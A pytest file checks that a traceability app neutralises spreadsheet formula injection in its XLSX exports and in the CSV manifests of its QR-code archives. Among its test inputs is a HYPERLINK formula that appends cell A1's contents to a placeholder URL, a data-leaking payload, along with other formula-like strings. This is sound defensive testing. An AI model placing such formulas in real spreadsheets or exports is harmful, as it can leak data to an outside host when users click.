"""Spreadsheet formula injection (CWE-1236) guards on every export.

Typed text (product / part / supplier names, supplier serials, template
fields) ends up in the XLSX exports and in the CSV manifests of the QR-code
archives, which warehouse staff open in Excel or WPS. Text starting with
``= + - @`` (or tab / CR) must stay inert there:

- XLSX cells are inline strings (never evaluated on open) and formula-like ones
  also carry ``quotePrefix`` so editing the cell cannot turn it into a formula.
- CSV cells get the OWASP leading apostrophe; numbers are left untouched.
"""
from __future__ import annotations

import csv
from io import BytesIO, StringIO
from zipfile import ZipFile

import pytest
from openpyxl import load_workbook

from app import create_app
from traceability.validators import csv_safe_row, looks_like_spreadsheet_formula
from traceability.xlsx_export import build_traceability_xlsx

FORMULA_LIKE = ["=1+1", "+SUM(A1:A2)", "-2+3", "@SUM(A1)", "\t=1+1", "\r=1+1"]


@pytest.mark.parametrize("text", FORMULA_LIKE)
def test_formula_like_text_is_detected(text):
    assert looks_like_spreadsheet_formula(text)


@pytest.mark.parametrize("value", ["普通文本", "PTS:P:ABC", "1+1", "a=b", "", 5, -5, 1.5, None])
def test_plain_values_are_not_treated_as_formulas(value):
    assert not looks_like_spreadsheet_formula(value)


def test_csv_rows_prefix_formula_text_and_keep_numbers():
    row = csv_safe_row([1, -2, "=HYPERLINK(\"http://example.invalid\",\"x\")", "供应商", "@cmd", None])
    assert row == [1, -2, "'=HYPERLINK(\"http://example.invalid\",\"x\")", "供应商", "'@cmd", None]


def test_xlsx_marks_formula_like_text_with_quote_prefix_on_both_row_styles():
    workbook_bytes = build_traceability_xlsx(
        ["名称", "数量"],
        [["=1+1", 1], ["普通", 2], ["@SUM(A1)", 3], ["-5", 4]],
    )
    sheet = load_workbook(BytesIO(workbook_bytes)).active

    # Headers are system text and keep their own style.
    assert [cell.value for cell in sheet[1]] == ["名称", "数量"]
    assert sheet["A1"].quotePrefix is False

    for reference, expected in (("A2", "=1+1"), ("A4", "@SUM(A1)"), ("A5", "-5")):
        cell = sheet[reference]
        # Exported verbatim, as text, never as a formula.
        assert cell.value == expected
        assert cell.data_type == "s"
        assert cell.quotePrefix is True, reference

    # Row 2 uses the plain body style and row 3 the zebra fill: the guarded
    # variants keep the same look.
    assert sheet["A2"].fill.fgColor.rgb == sheet["B2"].fill.fgColor.rgb
    assert sheet["A4"].fill.fgColor.rgb == sheet["B4"].fill.fgColor.rgb

    assert sheet["A3"].value == "普通"
    assert sheet["A3"].quotePrefix is False
    # Numbers stay numbers.
    assert sheet["B2"].value == 1
    assert sheet["B2"].data_type == "n"


@pytest.fixture()
def client(tmp_path):
    app = create_app({"TESTING": True, "DATABASE": str(tmp_path / "formula-safety.db")})
    return app.test_client()


def created(client, path, payload):
    response = client.post(path, json=payload)
    assert response.status_code == 201, response.get_json()
    return response.get_json()["data"]


def test_part_label_manifest_neutralises_formula_like_supplier_serials(client):
    supplier = created(client, "/api/suppliers", {"supplierCode": "SUP-CSV", "name": "供应商 CSV"})
    part = created(
        client,
        "/api/part-types",
        {"partCode": "PART-CSV", "name": "部件 CSV", "supplierId": supplier["id"]},
    )
    labels = created(
        client,
        "/api/part-labels",
        {"partTypeId": part["id"], "lotNo": "LOT-CSV", "supplierBatchNo": "SB-CSV", "quantity": 2},
    )
    malicious = '=HYPERLINK("http://example.invalid/?"&A1,"查看")'
    entered = client.put(
        f"/api/part-labels/{labels[0]['id']}",
        json={"sourceSerialNo": malicious, "enteredBy": "QC-CSV"},
    )
    assert entered.status_code == 200, entered.get_json()
    # The stored value itself is untouched; only the export is guarded.
    assert entered.get_json()["data"]["sourceSerialNo"] == malicious

    batches = client.get("/api/part-label-batches").get_json()["data"]
    download = client.get(f"/api/part-label-batches/{batches[0]['id']}/qrcodes.zip")
    assert download.status_code == 200
    with ZipFile(BytesIO(download.data)) as archive:
        manifest = archive.read("编码清单.csv").decode("utf-8-sig")
    rows = list(csv.reader(StringIO(manifest)))
    assert rows[0][3] == "供应商单件序列号"
    serials = {row[2]: row[3] for row in rows[1:]}
    assert serials[labels[0]["identificationCode"]] == "'" + malicious
    # Sequence numbers are still plain numbers.
    assert [row[0] for row in rows[1:]] == ["1", "2"]
